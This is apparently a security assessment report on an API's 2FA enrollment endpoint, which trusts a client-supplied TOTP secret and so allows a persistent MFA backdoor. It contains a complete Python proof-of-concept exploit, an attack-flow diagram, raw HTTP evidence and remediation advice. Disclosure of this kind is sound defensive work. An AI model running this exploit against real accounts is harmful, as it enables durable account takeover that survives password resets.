# 2FA Enrollment Accepts Client-Supplied `totp_secret` on POST /auth/2fa/enable — Persistent Account Backdoor

**ID:** vuln-0013
**Severity:** HIGH
**Found:** 2026-07-20 11:56:04 UTC
**Target:** https://api.taintedport.com
**Endpoint:** /auth/2fa/enable
**Method:** POST
**CWE:** CWE-287
**CVSS:** 8.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L)

## Description

The `POST /auth/2fa/enable` endpoint accepts a shared TOTP secret directly from the request body (`totp_secret`) and treats it as authoritative. The endpoint verifies the accompanying `totp_code` against the client-supplied secret — a check that trivially succeeds because the client generated both values — and then persists the client-chosen secret as the account's canonical `totp_secret`, setting `totp_enabled=true`.

`POST /auth/2fa/setup` (the endpoint that should be the sole authority on the shared secret) does not need to be called at all. Enrollment proceeds against a wholly attacker-provided secret. This violates the fundamental TOTP invariant that the shared secret must originate on the server and never be nominated by the client.

The vulnerable design also fails to require the user's current password at enable time (contrast `/auth/2fa/disable`, `/auth/password`, `/auth/email`, all of which do), so a passive session-theft is sufficient to backdoor MFA on the target account.

## Attack Flow

```
┌──────────────────────────────────────────────────────────────────────────┐
│  ROOT CAUSE:  POST /auth/2fa/enable reads the SHARED TOTP SECRET from a  │
│               client-supplied request-body field (`totp_secret`) and     │
│               persists it as the account's canonical secret.             │
│               No server-side "pending secret" is consulted.              │
│               Current password is NOT re-verified.                       │
└──────────────────────────────────────────────────────────────────────────┘

PREREQUISITE:  Attacker holds a valid JWT for the target account
               (via credential compromise, XSS, MITM, phishing, or the
                sibling JWT-signature-not-verified finding — which
                escalates this to fully unauthenticated).

    Attacker                                              api.taintedport.com
    ────────                                              ───────────────────

  ┌─────────────────────────┐
  │ 1. Generate attacker-   │
  │    chosen base32 secret │
  │    S = ATTACKER_SECRET  │
  │    (16 random bytes,    │
  │     base32-encoded)     │
  └───────────┬─────────────┘
              │
  ┌───────────▼─────────────┐
  │ 2. Compute TOTP code C  │
  │    = HOTP(S, now/30)    │
  │    (RFC 6238, SHA-1)    │
  └───────────┬─────────────┘
              │
              │  POST /auth/2fa/enable
              │  Authorization: Bearer <victim JWT>
              │  {"totp_secret": S,          ◀── attacker-chosen
              │   "totp_code":  C}
              ├──────────────────────────────────────▶  ┌──────────────────────┐
              │                                         │ Server verifies      │
              │                                         │ HOTP(S, now/30) == C │
              │                                         │  (TRUE — client made │
              │                                         │   both S and C)      │
              │                                         │                      │
              │                                         │ UPDATE users SET     │
              │                                         │  totp_secret = S,    │
              │                                         │  totp_enabled = 1    │
              │                                         │  WHERE id = victim   │
              │                                         └──────────┬───────────┘
              │                                                    │
              │  HTTP 200                                          │
              │  {"success":true,                                  │
              │   "message":"Two-factor auth enabled."}            │
              │◀───────────────────────────────────────────────────┘
              │
  ┌───────────▼─────────────┐        ┌──────────────────────────────────────────┐
  │ 3. Victim's account is  │        │  Meanwhile the victim:                   │
  │    now BACKDOORED:      │        │   • has no authenticator entry for S    │
  │    every login needs a  │        │   • sees `requires_2fa: true` on login  │
  │    TOTP code the        │        │   • has NO recovery flow (no backup     │
  │    attacker exclusively │        │     codes, no email challenge)          │
  │    controls.            │        │   • cannot rotate the secret without    │
  │                         │        │     first calling /auth/2fa/disable —   │
  │                         │        │     which requires successful 2FA'd     │
  │                         │        │     access first.                       │
  └───────────┬─────────────┘        └──────────────────────────────────────────┘
              │
              │  Whenever attacker wants access:
              │
              │  POST /auth/login
              │  {"email": victim,
              │   "password": victim-pw,
              │   "totp_code": HOTP(S, now/30)}
              ├──────────────────────────────────────▶  ┌──────────────────────┐
              │                                         │ Password OK          │
              │  HTTP 200                               │ HOTP(S, now/30) OK   │
              │  {"success":true,                       │ Issue session JWT    │
              │   "token": "<new session>"}             └──────────────────────┘
              │◀──── PERSISTENT ACCESS ─────────────────
              │
  ┌───────────▼──────────────────────────────────────────────────────────────┐
  │  PERSISTENCE PROPERTIES                                                  │
  │   • Victim password reset → attacker still authenticates (S unchanged). │
  │   • Victim email change    → attacker still authenticates.              │
  │   • Attacker JWT expires   → attacker relogs with victim's password + C.│
  │     (If attacker also stole/rotated the password separately, they can  │
  │      re-establish full access indefinitely.)                            │
  │   • Only revocation: operator-side MFA reset. No user self-service.    │
  └──────────────────────────────────────────────────────────────────────────┘
```

## Impact

Persistent account takeover that survives password reset.

An attacker who briefly holds a valid session token for a victim account — whether that token was stolen (XSS on localStorage, MITM, mobile-app leakage), phished, or forged via an unrelated authentication bug — can call `POST /auth/2fa/enable` with a TOTP secret only they know. From that moment on:

- Every subsequent login for the victim requires a TOTP code the attacker exclusively controls; the victim's authenticator app has no matching entry.
- Password rotation does NOT clear the attacker's TOTP secret. The victim cannot recover the account by resetting their password.
- No self-service recovery flow was observed on this API (no backup codes endpoint, no email challenge, no MFA-reset support). Recovery requires operator intervention.
- The attacker can also `POST /auth/2fa/disable` on the victim's behalf during the initial takeover to erase evidence, or leave the backdoor in place to lock the victim out and preserve durable access for themselves.

Confidentiality (H): all of the victim's private data (profile, orders, saved payment metadata) remains reachable by the attacker across arbitrary password changes.
Integrity (H): the attacker permanently modifies the victim's MFA state and can subsequently authenticate as the victim at will.
Availability (L): the victim can be locked out of their own account.

## Technical Analysis

Expected TOTP enrollment flow:
1. `POST /auth/2fa/setup` — server generates a random base32 secret, stores it as a pending value keyed to the calling `user_id`, and returns it plus an otpauth URI to the client.
2. `POST /auth/2fa/enable {totp_code}` — server looks up the pending secret for the calling user, verifies the submitted code against it, promotes the pending secret to the enabled column, and sets `totp_enabled = true`.

Observed flow:
1. `POST /auth/2fa/enable {totp_secret, totp_code}` — the server reads both the secret AND the code out of the request body, HMAC-verifies the code against the client-supplied secret, and on success stores the client's secret as the account's `totp_secret`. There is no cross-reference to any server-side pending secret; the pending secret (if any exists) is silently overwritten.

Two orthogonal server-side defects:
- The client is trusted to nominate the shared secret in a request body field.
- The server does not consult any server-side "pending TOTP secret" state for the calling user during enable.

Because the endpoint is only gated by the session bearer token (no current-password re-confirmation), any principal holding a valid JWT for the target account can rewrite the account's TOTP secret. The stored secret is not cleared by password change, email change, or profile update; the only legitimate reset is `POST /auth/2fa/disable {password}` — which the attacker can also perform during their window of access.

## Proof of Concept

Preconditions: the attacker holds a valid JWT for the target account. In this validation the JWT was obtained by simply logging in with credentials belonging to a fresh account we controlled (i.e. simulating a stolen token) — no /auth/2fa/setup call was needed. In a real attack the JWT could be stolen or forged.

Independent reproduction (from scratch, not copied from the tester):

1. Register a fresh victim account via `POST /auth/register` and capture the returned JWT.
2. Generate an attacker-chosen base32 TOTP secret client-side (e.g. 16 random bytes, base32-encoded).
3. Compute an RFC 6238 SHA-1 6-digit TOTP code for that secret at the current 30 s time step.
4. Call `POST /auth/2fa/enable` with `Authorization: Bearer <victim JWT>` and JSON body `{"totp_secret":"<attacker secret>","totp_code":"<code>"}`. The server returns `HTTP 200 {"success":true,"message":"Two-factor authentication enabled successfully."}`.
5. Confirm `GET /auth/me` now returns `totp_enabled: true`.
6. Confirm `POST /auth/login {email,password}` now returns `{"success":false,"requires_2fa":true,"message":"Two-factor authentication code required."}`.
7. Compute a fresh TOTP code from the attacker's secret and confirm `POST /auth/login {email,password,totp_code}` returns HTTP 200 with a valid session token.

All seven steps completed successfully. The `poc/poc.py` script performs the full sequence with a self-registering victim so it is safe to re-run. The `poc/verify.py` script returns exit 0 with a `[VULNERABLE]` banner when the endpoint still trusts client-supplied secrets.

```
     1	#!/usr/bin/env python3
     2	"""Exploit: 2FA enrollment accepts attacker-chosen TOTP secret.
     3	
     4	Demonstrates that POST /auth/2fa/enable trusts a client-supplied
     5	``totp_secret`` field. An attacker who has a valid session token for
     6	the victim (obtained via any means — phishing, XSS on localStorage,
     7	JWT-forgery, MITM, transient theft) can silently install a TOTP
     8	secret that only THEY know. From that moment forward the victim's
     9	account requires a TOTP code the attacker exclusively controls;
    10	password reset does NOT clear it.
    11	
    12	This script registers its OWN test victim account, so it is safe to
    13	run against a shared environment without touching real accounts.
    14	
    15	Optional env vars (with defaults):
    16	    TARGET_URL          Base URL (default: https://api.taintedport.com)
    17	
    18	Usage:
    19	    python3 poc.py
    20	Non-interactive:
    21	    python3 poc.py --no-pause
    22	"""
    23	import os, sys, time, json, argparse, base64, hmac, hashlib, struct, secrets
    24	import requests, urllib3
    25	urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    26	
    27	RED = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"
    28	BOLD = "\033[1m"; RESET = "\033[0m"; CYAN = "\033[96m"
    29	
    30	TARGET_URL = os.environ.get("TARGET_URL", "https://api.taintedport.com")
    31	
    32	
    33	def step(n, msg):
    34	    print(f"{CYAN}[Step {n}]{RESET} {msg}")
    35	
    36	
    37	def ok(msg):
    38	    print(f"  {GREEN}✓ {msg}{RESET}")
    39	
    40	
    41	def fail(msg):
    42	    print(f"  {RED}✗ {msg}{RESET}")
    43	    sys.exit(1)
    44	
    45	
    46	def totp(secret_b32: str, digits: int = 6, step_s: int = 30) -> str:
    47	    """RFC 6238 SHA-1 TOTP."""
    48	    t = int(time.time())
    49	    counter = t // step_s
    50	    padded = secret_b32 + "=" * ((8 - len(secret_b32) % 8) % 8)
    51	    key = base64.b32decode(padded, casefold=True)
    52	    msg = struct.pack(">Q", counter)
    53	    h = hmac.new(key, msg, hashlib.sha1).digest()
    54	    off = h[-1] & 0x0f
    55	    code = (struct.unpack(">I", h[off:off + 4])[0] & 0x7fffffff) % (10 ** digits)
    56	    return f"{code:0{digits}d}"
    57	
    58	
    59	def register(session, email, password):
    60	    r = session.post(f"{TARGET_URL}/auth/register",
    61	                     json={"name": "PoC Test", "email": email, "password": password},
    62	                     verify=False, timeout=15)
    63	    if r.status_code not in (200, 201) or not r.json().get("success"):
    64	        fail(f"Register failed HTTP {r.status_code}: {r.text[:200]}")
    65	    return r.json()["token"]
    66	
    67	
    68	def login(session, email, password, totp_code=None):
    69	    body = {"email": email, "password": password}
    70	    if totp_code is not None:
    71	        body["totp_code"] = totp_code
    72	    r = session.post(f"{TARGET_URL}/auth/login", json=body, verify=False, timeout=15)
    73	    return r.status_code, r.json()
    74	
    75	
    76	def run(interactive=True):
    77	    def pause(msg="Press Enter to continue..."):
    78	        if interactive:
    79	            input(f"\n  >>> {msg}")
    80	
    81	    print(f"\n{BOLD}{'='*72}")
    82	    print(f"  EXPLOIT: 2FA Enrollment Accepts Attacker-Chosen TOTP Secret")
    83	    print(f"  Target:  {TARGET_URL}")
    84	    print(f"  Endpoint: POST /auth/2fa/enable")
    85	    print(f"{'='*72}{RESET}\n")
    86	
    87	    s = requests.Session()
    88	
    89	    email = f"poc-2fa-{int(time.time())}-{secrets.token_hex(3)}@example.com"
    90	    password = f"PoCTest!23-{secrets.token_hex(4)}"
    91	
    92	    step(1, f"Registering fresh victim account: {email}")
    93	    token = register(s, email, password)
    94	    ok("Victim registered and initial JWT issued")
    95	    pause()
    96	
    97	    # Attacker chooses their own base32 secret.
    98	    raw = secrets.token_bytes(16)
    99	    attacker_secret = base64.b32encode(raw).decode().rstrip("=")
   100	    print(f"\n  {YELLOW}Attacker-chosen TOTP secret:{RESET} {BOLD}{attacker_secret}{RESET}")
   101	    print(f"  {YELLOW}(server was NEVER asked for a secret via /auth/2fa/setup){RESET}")
   102	
   103	    code = totp(attacker_secret)
   104	    step(2, "Calling POST /auth/2fa/enable with the ATTACKER'S secret + code...")
   105	    r = s.post(f"{TARGET_URL}/auth/2fa/enable",
   106	               headers={"Authorization": f"Bearer {token}"},
   107	               json={"totp_secret": attacker_secret, "totp_code": code},
   108	               verify=False, timeout=15)
   109	    if r.status_code != 200 or not r.json().get("success"):
   110	        fail(f"/auth/2fa/enable rejected our secret — HTTP {r.status_code}: {r.text[:200]}")
   111	    ok(f"Server accepted attacker-chosen secret: {r.json().get('message')}")
   112	
   113	    step(3, "Confirming totp_enabled=true via /auth/me...")
   114	    r = s.get(f"{TARGET_URL}/auth/me",
   115	              headers={"Authorization": f"Bearer {token}"},
   116	              verify=False, timeout=15)
   117	    me = r.json().get("user", {})
   118	    if not me.get("totp_enabled"):
   119	        fail("/auth/me does not reflect totp_enabled=true — enable did not persist")
   120	    ok(f"/auth/me reports totp_enabled=true for user id={me.get('id')}")
   121	    pause("2FA backdoored. Press Enter to verify login gating...")
   122	
   123	    step(4, "Attempting to log in with password ONLY (no TOTP)...")
   124	    sc, body = login(s, email, password)
   125	    if not body.get("requires_2fa"):
   126	        fail(f"Login did not gate on 2FA — HTTP {sc}: {body}")
   127	    ok(f"Login refuses without TOTP: requires_2fa={body.get('requires_2fa')}")
   128	
   129	    step(5, "Attacker computes a fresh TOTP code from THEIR secret and logs in...")
   130	    code2 = totp(attacker_secret)
   131	    sc, body = login(s, email, password, code2)
   132	    if sc != 200 or not body.get("token"):
   133	        fail(f"Attacker TOTP code failed — HTTP {sc}: {body}")
   134	    ok(f"Attacker-controlled TOTP grants a valid session token")
   135	
   136	    print(f"\n{RED}{BOLD}  >>> VULNERABILITY CONFIRMED{RESET}")
   137	    print(f"{RED}{BOLD}  >>> POST /auth/2fa/enable trusts the client's `totp_secret`.{RESET}")
   138	    print(f"{RED}{BOLD}  >>> An attacker with a valid session can install a TOTP secret{RESET}")
   139	    print(f"{RED}{BOLD}  >>> only THEY know, backdooring the account. Password reset does{RESET}")
   140	    print(f"{RED}{BOLD}  >>> NOT clear the attacker's TOTP secret — persistence is durable.{RESET}\n")
   141	
   142	    print(f"  Attacker secret : {attacker_secret}")
   143	    print(f"  Victim email    : {email}")
   144	    print(f"  Victim id       : {me.get('id')}")
   145	    print()
   146	
   147	
   148	if __name__ == "__main__":
   149	    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
   150	    ap.add_argument("--no-pause", action="store_true", help="Run without interactive pauses")
   151	    args = ap.parse_args()
   152	    run(interactive=not args.no_pause)
```

## Evidence

### 1. Register a fresh victim account to obtain a session token

**Request:**
```http
POST /auth/register HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"name":"Validator19 Test","email":"valid19-1784548342@example.com","password":"ValidTest!23-f2f5759c"}
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"message":"User registered successfully","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<...>","user":{"id":468,"name":"Validator19 Test","email":"valid19-1784548342@example.com","is_admin":false}}
```

> Standard registration path returns a valid JWT. No /auth/2fa/setup is invoked at any point in this exploit.

### 2. Enable 2FA with an ATTACKER-CHOSEN TOTP secret (no /auth/2fa/setup call)

**Request:**
```http
POST /auth/2fa/enable HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<victim token>

{"totp_secret":"KZAUYSKEIFKE6URRHFKEKU2UEE","totp_code":"988057"}
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"message":"Two-factor authentication enabled successfully."}
```

> The `totp_secret` field is fully attacker-controlled. The server validates the accompanying `totp_code` against that same client-supplied secret (a check that trivially succeeds because the client generated both) and persists the client's secret as the account's canonical TOTP secret. Current password is not required.

### 3. Confirm totp_enabled=true via /auth/me

**Request:**
```http
GET /auth/me HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<victim token>
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"user":{"id":468,"name":"Validator19 Test","email":"valid19-1784548342@example.com","is_admin":false,"totp_enabled":true,"created_at":"2026-07-20 11:52:22"}}
```

> The account is now backdoored — totp_enabled=true, tied to a secret only the attacker knows.

### 4. Login with password only is refused

**Request:**
```http
POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"email":"valid19-1784548342@example.com","password":"ValidTest!23-f2f5759c"}
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":false,"requires_2fa":true,"message":"Two-factor authentication code required."}
```

> The victim can no longer authenticate with just their password — a TOTP code is required. Since the enrolled secret was never displayed to the victim, they have no authenticator app entry that produces valid codes.

### 5. Login succeeds with a TOTP code from the ATTACKER'S secret

**Request:**
```http
POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"email":"valid19-1784548342@example.com","password":"ValidTest!23-f2f5759c","totp_code":"988057"}
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<new session>","user":{"id":468,"name":"Validator19 Test","email":"valid19-1784548342@example.com","is_admin":false}}
```

> A valid session token is returned when the attacker supplies a code computed from the secret they chose in step 2. Persistence is durable: password reset by the victim would not remove the attacker's secret.


## Remediation

1. Remove `totp_secret` from the `POST /auth/2fa/enable` request contract. The server must be the sole authority on the shared secret. Ignore or explicitly reject the field if a client sends it.
2. Store a pending secret server-side during `POST /auth/2fa/setup` (e.g. a `pending_totp_secret` column with an expiry timestamp). Ensure it is keyed to the calling `user_id`.
3. On `POST /auth/2fa/enable`: read the pending secret for the calling `user_id`, verify the submitted `totp_code` against it, and — only on success — promote it to `totp_secret`, set `totp_enabled = true`, and clear `pending_totp_secret`. Reject enable requests where no pending secret exists or the pending secret has expired.
4. Require the user's current password on `POST /auth/2fa/enable` (matching the gating on `/auth/2fa/disable`, `/auth/password`, and `/auth/email`) so a passively-stolen session token is insufficient to backdoor MFA.
5. Emit an alert email to the account holder whenever 2FA is enabled, disabled, or the underlying secret is rotated. Include a "this wasn't me" link that revokes all active sessions and disables 2FA.
6. Audit existing accounts with `totp_enabled=1` whose stored secret does not match any secret ever issued by `/auth/2fa/setup` (compare against setup-time logs / audit trail): those accounts are candidates for having been backdoored via this bug and should have MFA reset out-of-band.
7. Rate-limit repeated `POST /auth/2fa/enable` attempts per session and per account to slow abuse.

## Conditions for Severity Increase

If chained with the JWT-signature-not-verified finding on this host (an attacker can forge a JWT for any `user_id` with no credentials), Privileges Required drops from L to N, raising CVSS from 8.3 (High) to 9.4 (Critical). In that chain, an unauthenticated attacker forges a token for any target `user_id`, backdoors that account's MFA with a secret only they know, and the backdoor persists across arbitrary victim password rotations. Remediating the JWT bug alone is insufficient because token theft via other channels (XSS on localStorage, mobile-app leakage, MITM on a downstream service) would still allow MFA backdooring via this endpoint.

Additionally, if a self-service password-reset flow is added in the future that leaves `totp_secret` untouched (which is the typical implementation), the persistence value of this backdoor increases further.
